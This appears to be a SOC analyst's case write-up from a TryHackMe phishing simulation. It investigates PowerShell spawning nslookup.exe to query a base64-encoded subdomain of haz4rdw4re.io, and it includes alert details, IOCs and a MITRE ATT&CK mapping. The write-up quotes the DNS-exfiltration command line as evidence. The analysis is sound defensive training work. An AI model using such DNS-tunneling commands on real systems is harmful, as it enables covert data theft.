# Case 03: Suspicious DNS Request via PowerShell Investigation

## Source

**Platform:** TryHackMe

**Room/Simulation:** Phishing Unfolding Simulation

**Environment:** Simulated SOC Investigation Lab

---

## Overview

During the investigation, a security alert identified an unusual parent-child process relationship involving **PowerShell** and **nslookup.exe**. The alert revealed that PowerShell spawned `nslookup.exe` to query a suspicious domain.

Further analysis showed that the DNS query contained an encoded string and communicated with the domain **`haz4rdw4re.io`**, indicating possible DNS-based data exfiltration or command-and-control (C2) activity.

---

## Scenario

A security alert was generated after Sysmon detected `nslookup.exe` being launched by `powershell.exe` on host **win-3450**.

The command line revealed that `nslookup.exe` queried a suspicious subdomain containing an encoded string followed by the domain **`haz4rdw4re.io`**. Since PowerShell spawning `nslookup.exe` with encoded data is uncommon in normal user activity, the event was investigated to determine whether malicious activity had occurred.

---

## Alert Details

| Field                | Value                                                                     |
| -------------------- | ------------------------------------------------------------------------- |
| Alert Name           | Suspicious Parent-Child Process Relationship                              |
| Category             | Execution                                                                 |
| Severity             | Low                                                                       |
| Data Source          | Sysmon                                                                    |
| Timestamp            | 27 June 2026, 09:09:49 UTC                                                |
| Event Code           | 1                                                                         |
| Host Name            | `win-3450`                                                                |
| Process Name         | `nslookup.exe`                                                            |
| Process ID           | `3648`                                                                    |
| Parent Process       | `powershell.exe`                                                          |
| Parent Process ID    | `3728`                                                                    |
| Command Line         | `"C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io` |
| Working Directory    | `C:\Users\michael.ascot\downloads\`                                       |
| Event Action         | `Process Create (rule: ProcessCreate)`                                    |
| Investigation Result | True Positive                                                             |
| Final Classification | Suspicious DNS Activity / Possible Data Exfiltration                      |



## Investigation Steps

### Step 1: Review the Alert

The investigation began by reviewing the Sysmon alert. The alert indicated that an uncommon parent-child relationship had been detected on host `win-3450`.

Key observations:

* Process Name: `nslookup.exe`
* Parent Process: `powershell.exe`
* Event Code: `1` (Process Create)
* Host: `win-3450`

### Evidence

<img width="1305" height="424" alt="alert 4" src="https://github.com/user-attachments/assets/2aaf3428-d729-454a-93cb-268a91b6e1a9" />

---

### Step 2: Analyze the Parent-Child Relationship

Further analysis revealed that `nslookup.exe` was spawned by `powershell.exe`.

PowerShell launching `nslookup.exe` is uncommon during normal user activity and may indicate malicious behavior, such as DNS-based command-and-control (C2) communication or data exfiltration.

### Evidence

<img width="517" height="409" alt="alert 4 evidece" src="https://github.com/user-attachments/assets/6645d231-31c1-4a97-8d07-132632954535" />

---

### Step 3: Inspect the Command Line

The command line associated with the process creation event was reviewed:

```text
"C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io
```

The DNS query contained an encoded string followed by the suspicious domain `haz4rdw4re.io`.

The presence of encoded data within a DNS request strongly suggested potential DNS tunneling or data exfiltration activity.

### Evidence


---

### Step 4: Determine the Verdict

Based on the suspicious PowerShell-to-nslookup parent-child relationship, the use of an encoded DNS query, and communication with the suspicious domain `haz4rdw4re.io`, the alert was classified as a **True Positive**.

The activity was indicative of possible DNS-based command-and-control or data exfiltration activity and was escalated for further investigation.

## Final Verdict

> **True Positive – Suspicious DNS Activity / Possible Data Exfiltration**

**Action Taken:** Escalated to a Senior Analyst for further investigation.



## Indicators of Compromise (IOCs)

| IOC Type          | Value                                  |
| ----------------- | -------------------------------------- |
| Host              | `win-3450`                             |
| Process           | `nslookup.exe`                         |
| Parent Process    | `powershell.exe`                       |
| Domain            | `haz4rdw4re.io`                        |
| Queried FQDN      | `RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io` |
| Working Directory | `C:\Users\michael.ascot\downloads\`    |

## MITRE ATT&CK Mapping

| Tactic              | Technique                                     | ID        |
| ------------------- | --------------------------------------------- | --------- |
| Execution           | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Command and Control | Application Layer Protocol: DNS               | T1071.004 |
| Exfiltration        | Exfiltration Over Alternative Protocol        | T1048     |

## Key Findings

* `nslookup.exe` was launched by `powershell.exe`, creating an unusual parent-child relationship.
* The DNS query contained an encoded string, indicating potentially suspicious activity.
* The queried domain `haz4rdw4re.io` appeared suspicious and may have been used for command-and-control or data exfiltration.
* The activity was classified as a **True Positive** and escalated for further investigation.










